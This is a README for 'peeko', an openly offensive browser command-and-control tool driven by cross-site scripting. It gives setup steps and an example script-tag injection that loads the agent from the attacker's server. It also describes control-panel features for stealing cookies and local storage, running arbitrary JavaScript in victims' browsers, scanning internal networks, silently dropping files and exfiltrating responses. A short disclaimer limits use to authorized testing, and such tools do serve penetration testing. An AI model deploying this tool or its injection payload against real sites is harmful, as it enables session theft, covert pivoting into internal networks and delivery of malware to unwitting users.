## peeko

**Version:** v1.0

`peeko` is a browser-based XSS-powered C2 (Command and Control) tool that leverages the victim’s browser as a stealthy proxy inside internal networks.

Through an injected XSS payload, peeko establishes a WebSocket connection to a central server, allowing an attacker to remotely control the victim’s browser to send requests to internal services, scan networks, exfiltrate data, or even execute arbitrary JavaScript — all without dropping a single binary.

---

## Features

- WebSocket-based communication between attacker and victims  
- Victim browser fetches internal URLs and scans IP ranges + ports  
- Simple control panel with:
  - Victim selector  
  - Manual URL fetch  
  - IP and port range scanner  
  - Custom JS execution (manual or automatic)  
  - File delivery (auto/manual)  
  - Browser info and token collection (cookies, storage, etc.)  
  - Log viewer with copy/save as `.txt` or `.json`  
- HTTPS support with self-signed certificates  
- Lightweight: single Python file + static assets  

---

## Requirements

- Python 3.8+  
- OpenSSL  
- Linux/macOS (tested on Debian-based systems)  

---

## Quick Start

1. Clone the repository:

    ```bash
    git clone https://github.com/b3rito/peeko.git
    cd peeko
    ```

2. Install dependencies:

    ```bash
    make install
    ```

3. (Optional) Make scripts executable:

    ```bash
    chmod +x gen-cert.sh start.sh
    ```

4. Generate self-signed TLS certificate:

    ```bash
    make cert
    ```

5. Replace the `SERVER-IP` placeholder:

    Open and edit the following files:

    - `static/agent.js`
    - `static/control.html`

    Replace `SERVER-IP` with the IP/domain of your server:

    ```js
    wss://SERVER-IP:8443/ws → wss://192.168.30.136:8443/ws
    ```

6. Start the server:

    ```bash
    make run
    ```

7. Open the control panel in your browser:

    ```
    https://192.168.30.136:8443/static/control.html
    ```

8. Inject the agent (example XSS):

    ```html
    <script src="https://192.168.30.136:8443/static/agent.js"></script>
    ```

---

## Control Panel Features

### Core Functions

- Select and manage connected victims  
- Fetch any internal/external HTTPS URL via the victim  
- Scan LAN ranges: `192.168.1.0/24`, `10.0.0.10-20`, etc.  
- Scan specific ports or ranges (e.g., `80`, `443,8000-8080`)  

### File Delivery

- Send files to the victim (Base64 via WebSocket)  
- Victim browser automatically downloads them  
- Supports auto-upload on connect  

### Info Gathering

- Collect User Agent, platform, referrer, cookies, local/sessionStorage  
- View results in JSON  
- Triggered manually or auto-collect on connect  

### Custom JS Execution

- Run arbitrary JavaScript on the victim browser  
- Use `exec:...` format to send  
- Supports **auto-run** on connect  
- Example: `exec:alert(document.cookie);`  

### Logging

- Everything is logged (requests, responses, info dumps)  
- Copy or export logs as `.txt` or `.json`  
- Minimalist UI designed like a terminal log  

---

## CORS & Mixed Content Explained

Modern browser policies affect what peeko can access.

### CORS Responses

| Header | Can read content? | Notes |
|--------|-------------------|-------|
| `Access-Control-Allow-Origin: *` | ✅ | Full access to response |
| No header | ⚠️ | Response is opaque |
| Restricted origin | ❌ | Blocked or unreadable |

### Mixed Content

Victim connects via HTTPS. If a scanned target only uses HTTP:

- Browser will block mixed content requests  
- peeko cannot read from `http://` endpoints  
- Always prefer targets using HTTPS when scanning

### In Practice

During a penetration test, if you find an internal service that responds with `Access-Control-Allow-Origin: *` and is served over HTTPS, then peeko becomes a stealth proxy capable of exfiltrating internal data directly from the victim's browser without dropping any files or opening outbound connections.


---

## Project Structure

```
peeko/
├── main.py             → FastAPI WebSocket server  
├── start.sh            → Launch server  
├── gen-cert.sh         → Generate self-signed TLS certificate  
├── Makefile            → Install/run helpers  
├── requirements.txt    → Python dependencies  
├── certs/              → TLS key and cert will be stored here  
└── static/             → Browser client assets  
    ├── control.html    → Control panel (was attacker.html)  
    ├── infect.html     → Victim landing page  
    └── agent.js        → Victim agent script  
```

---

## Workflow

1. Attacker injects XSS (via stored or reflected vuln)  
2. Victim’s browser connects via WebSocket to peeko server  
3. Control panel lets attacker:  
   - Scan network  
   - Fetch URLs  
   - Dump cookies, storage  
   - Run arbitrary JS  
   - Exfiltrate responses
   - Drop files

---

## Use Cases

- Internal network mapping via XSS  
- Browser-based pivoting  
- Silent file delivery / JS dropper  

---

## Disclaimer

This tool is provided for educational and authorized testing purposes only.  
Any use of peeko outside of environments where you have explicit permission is **strictly prohibited**.  
You are responsible for your own actions.

---

## Authors

Written by **b3rito** at mes3hacklab & **GioPpeTto**
